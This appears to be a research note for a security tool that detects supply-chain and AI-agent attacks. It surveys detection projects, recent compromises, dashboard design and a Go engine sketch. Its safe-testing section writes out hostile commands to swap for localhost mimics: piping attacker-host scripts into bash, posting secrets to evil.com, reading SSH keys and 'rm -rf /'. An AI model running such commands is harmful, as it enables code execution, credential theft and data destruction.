# Research: Latest Security Projects for Detection & Prevention

**Date**: 2026-03-30  
**Purpose**: Identify open-source projects to learn from for robust detection capabilities

---

## Key Projects Analyzed

### 1. MEDUSA (Pantheon Security) ⭐ PRIMARY INSPIRATION

**GitHub**: github.com/Pantheon-Security/medusa  
**Status**: Active (v2026.4.0, March 2026)  
**License**: AGPL-3.0 (free, open source)

**Key Capabilities**:
- **7,300+ detection patterns** across 76 analyzers
- **96.8% false positive reduction** with 508 intelligent filters
- **800+ prompt injection rules** (direct, indirect, jailbreaks, role manipulation)
- **500+ agent security issues**
- **400+ MCP protocol vulnerabilities**
- **350+ supply chain risks**
- **133 known CVEs** (Log4Shell, Spring4Shell, XZ Utils, LangChain RCE, MCP RCE)

**Detection Categories**:
1. Prompt injection (800 patterns)
2. AI agent security (500 patterns)
3. MCP/protocol vulns (400 patterns)
4. Model security (400 patterns)
5. Supply chain (350 patterns)
6. RAG security (300 patterns)
7. Repo poisoning (28+ config files across 15+ AI tools)

**Real-Time Capabilities**:
- IDE integration (Cursor, VS Code, Claude Code, Gemini)
- Runtime proxy mode for attack blocking
- Git repository scanning

**What We Can Learn**:
✅ Multi-category rule organization (76 analyzers)  
✅ False positive filtering system (508 filters)  
✅ Repo poisoning detection (config file tampering)  
✅ MCP protocol security patterns  
✅ Real-time IDE integration approach  

---

### 2. Supply Chain Scanners

#### supply-chain-scanner (Quality-Max)

**Released**: March 2026  
**Focus**: Python packages (PyPI)

**Detections** (17 types, 7 categories):
1. Known compromised packages
2. Typosquatting
3. Malicious `.pth` file injection
4. Encoded exfiltration payloads
5. String concatenation obfuscation
6. Suspicious install hooks
7. Runtime environment manipulation

**Performance**: 2 seconds, zero dependencies

**What We Can Learn**:
✅ `.pth` file injection detection (Python-specific attack)  
✅ Encoded payload detection (base64, hex, etc.)  
✅ String obfuscation patterns  

#### npm-shai-hulud-scanner (Drasrax)

**Focus**: NPM self-replicating worm detection

**Capabilities**:
- Detects 1,193+ compromised NPM packages
- Identifies malicious code injection
- Tracks typosquatting campaigns
- Suspicious installation script detection

**What We Can Learn**:
✅ Worm propagation patterns  
✅ Package version tracking for known-bad  
✅ Campaign correlation (related malicious packages)  

---

### 3. AI Guardrails & Monitoring

#### Sentinel AI (MaxwellCalkin)

**Features**:
- **Sub-millisecond latency** protection
- **11 built-in scanners** (OWASP LLM Top 10)
- Lightweight: regex-based, no heavy ML dependencies
- Python + TypeScript SDKs

**Detections**:
1. Prompt injection
2. PII leakage
3. Harmful content
4. Hallucination indicators

**What We Can Learn**:
✅ Sub-ms detection (critical for real-time)  
✅ Regex-first approach (no heavy models needed)  
✅ Multi-language SDK pattern  

#### NeMo Guardrails (NVIDIA)

**GitHub**: 5,885+ stars  
**Maturity**: Production-ready

**Capabilities**:
- Programmable guardrails for LLM systems
- Input/output rails
- Retrieval rails (RAG protection)
- Topical rails (conversation boundaries)
- Colang DSL for defining policies

**What We Can Learn**:
✅ Policy as code (DSL for guardrails)  
✅ Multi-layer protection (input/output/retrieval)  
✅ Topical constraints (limit conversation scope)  

#### Aegis (Acacian)

**Approach**: Auto-instrumentation framework

**Features**:
- Zero code changes (monkey-patching)
- LangChain, CrewAI, OpenAI, Anthropic support
- OpenTelemetry-style security
- Sub-millisecond overhead
- Prompt injection detection
- PII masking
- Audit trails

**What We Can Learn**:
✅ Zero-touch instrumentation pattern  
✅ OpenTelemetry-inspired security observability  
✅ Multi-framework support via monkey-patching  

#### Reivo-Guard

**Focus**: Runaway agent prevention

**Techniques**:
- Loop detection (hash + TF-IDF cosine similarity)
- Cost tracking (exponential weighted moving averages)
- Quality verification
- Sub-microsecond overhead

**What We Can Learn**:
✅ Loop detection algorithms  
✅ Cost anomaly detection  
✅ Performance optimization patterns  

---

### 4. Recent Supply Chain Attacks (Reference)

**March 2026 - LiteLLM Compromise**:
- Malicious PyPI releases (36% cloud usage)
- Multi-stage credential stealer
- Harvested cloud keys, K8s secrets, crypto wallets
- Via poisoned Trivy binary exposing PyPI token

**What We Can Learn**:
✅ Multi-stage attack detection  
✅ Credential harvesting patterns  
✅ Dependency confusion risks  

**Feb 2026 - Shai-Hulud Worm**:
- Self-replicating NPM worm
- 1,193+ packages compromised
- Crypto theft + propagation

**What We Can Learn**:
✅ Self-propagation detection  
✅ Behavioral anomaly (package installing packages)  

---

## Detection Patterns to Implement

### From MEDUSA (High Priority)

1. **Prompt Injection** (800 patterns):
   - Direct injection
   - Indirect (via file/URL content)
   - Jailbreak attempts
   - Role manipulation
   - Delimiter attacks

2. **Repo Poisoning** (28+ config files):
   - `.cursorrules`
   - `.clinerules`
   - `.claude_code_config`
   - `.github/copilot/`
   - `.aider.conf.yml`
   - `.windsurf/`
   - MCP server configs

3. **MCP Security** (400 patterns):
   - Remote code execution
   - Unauthorized tool calls
   - Resource exhaustion
   - Protocol violations

### From Supply Chain Scanners

4. **Python-Specific**:
   - `.pth` file injection
   - `setup.py` abuse
   - Encoded payloads (base64, hex, ROT13)
   - `__init__.py` backdoors

5. **NPM-Specific**:
   - `preinstall`/`postinstall` hooks
   - Typosquatting (edit distance)
   - Dependency confusion
   - Native module abuse

### From AI Guardrails

6. **Tool Call Monitoring**:
   - Shell execution patterns
   - File write to sensitive paths
   - Network requests to unknown domains
   - Loop detection (repetitive calls)
   - Cost anomalies

7. **Context Analysis**:
   - PII in prompts
   - Credential patterns
   - Hallucination indicators
   - Topical boundary violations

---

## Frontend Design Inspiration

### Modern Security Dashboard Requirements

**Real-Time Monitoring**:
- WebSocket/SSE for live event streaming
- Auto-refresh metrics (every 5s)
- Alert notifications (browser notifications)

**Detection Capabilities**:
- Rule management (enable/disable)
- Custom rule creation
- Threshold tuning
- False positive flagging

**Prevention Controls**:
- Policy mode switching (permissive/blocking/monitor)
- Allowlist/denylist management
- Emergency block (instant package denial)
- Quarantine queue

**Monitoring Features**:
- Real-time event feed
- Threat timeline
- Agent health status
- Performance metrics

**Technology Stack** (Modern):
- **Framework**: React + TypeScript (or Vue 3)
- **Real-time**: WebSocket
- **Charts**: Chart.js or Recharts
- **State**: Zustand or Redux Toolkit
- **UI**: Tailwind CSS + shadcn/ui
- **Icons**: Lucide React

---

## Architecture Enhancements to Implement

### Detection Engine (Inspired by MEDUSA)

```go
// agent/internal/detection/engine.go
type DetectionEngine struct {
    analyzers []Analyzer     // 76+ analyzers
    filters   []Filter       // 508 filters for FP reduction
    rules     []Rule         // 7300+ patterns
}

type Analyzer interface {
    Name() string
    Analyze(event Event) []Finding
}

// Analyzers:
// - PromptInjectionAnalyzer (800 patterns)
// - TypesquatAnalyzer
// - EncodedPayloadAnalyzer
// - RepoPoisoningAnalyzer
// - MCPSecurityAnalyzer
// - LoopDetectionAnalyzer
// - PIILeakageAnalyzer
```

### False Positive Reduction (Inspired by MEDUSA)

```go
type Filter interface {
    ShouldSuppress(finding Finding) bool
}

// Filters:
// - KnownBenignPackages
// - LegitimateUseCases
// - ContextualWhitelist
// - ConfidenceThreshold
// - TemporalPatterns (not suspicious at 2am if always runs then)
```

### Real-Time Prevention (Inspired by Sentinel AI)

```go
// Sub-millisecond decision path
func (e *Engine) QuickScreen(event Event) Verdict {
    // 1. Cache check (<1ms)
    // 2. Regex patterns (<5ms)
    // 3. Hash lookup (<1ms)
    // Return before complex analysis if match
}
```

---

## Recommendations for Our Implementation

### Detection Engine Enhancements

1. **Add 76+ Analyzer Framework**:
   - Modular analyzers like MEDUSA
   - Each analyzer focuses on specific attack type
   - Easy to add new analyzers

2. **Implement FP Filter System**:
   - 500+ filters to reduce false positives
   - Context-aware suppression
   - Temporal and behavioral patterns

3. **Expand Rule Coverage**:
   - Current: 15 rules
   - Target: 1000+ rules (inspired by MEDUSA's 7,300)
   - Categories: Prompt injection, repo poisoning, MCP, supply chain

### Frontend Enhancements

4. **Modern React Dashboard**:
   - Real-time event streaming (WebSocket)
   - Interactive rule management
   - Visual threat timeline
   - Policy controls

5. **Prevention UI**:
   - One-click block/allow
   - Quarantine review queue
   - Bulk operations
   - Policy mode toggle

6. **Monitoring UI**:
   - Agent fleet view
   - Performance metrics
   - Alert management
   - Investigation tools

---

## Implementation Priority

### Tier 1 (This Phase)

1. ✅ MEDUSA-style analyzer framework
2. ✅ Safe Docker simulation environment
3. ✅ Modern React frontend (real-time)
4. ✅ Test scenarios with harmless mimics

### Tier 2 (Next Phase)

1. False positive filter system
2. Loop detection (Reivo-Guard approach)
3. Repo poisoning detection (28+ config files)
4. MCP security patterns

### Tier 3 (Future)

1. Zero-touch instrumentation (Aegis pattern)
2. Policy DSL (NeMo Guardrails inspiration)
3. LLM-based semantic analysis
4. Threat intelligence integration

---

## Safe Testing Strategy

### Harmless Mimics for Docker Simulation

**Instead of Malicious**:
```python
# DON'T: curl http://evil.com | bash
# DO: curl http://localhost:8080/safe-test-endpoint | cat
```

**Package Name Patterns** (No actual malicious code):
```
Benign:          Typosquat Mimic:    Test Method:
-------          ----------------    ------------
requests    →    requsets            Edit distance check
react       →    reactt              Fuzzy match test
lodash      →    lodahs              Similarity scoring
```

**Install Script Patterns** (Safe):
```python
# Mimic credential access (no real access)
# Instead of: open("~/.ssh/id_rsa").read()
# Use: print("MIMIC: Would read ~/.ssh/id_rsa")

# Mimic network exfil (localhost only)
# Instead of: requests.post("evil.com", data=secrets)
# Use: requests.post("localhost:8080/test-exfil", data="test")
```

**AI Tool Calls** (Safe):
```bash
# Instead of: rm -rf /
# Use: echo "MIMIC: rm -rf /" (no actual deletion)

# Instead of: curl attacker.com | bash
# Use: curl localhost:8080/safe-endpoint (logs request only)
```

---

*This research will guide the Docker simulation and frontend implementation.*  
*Focus: MEDUSA's detection breadth + Sentinel AI's speed + modern frontend UX*
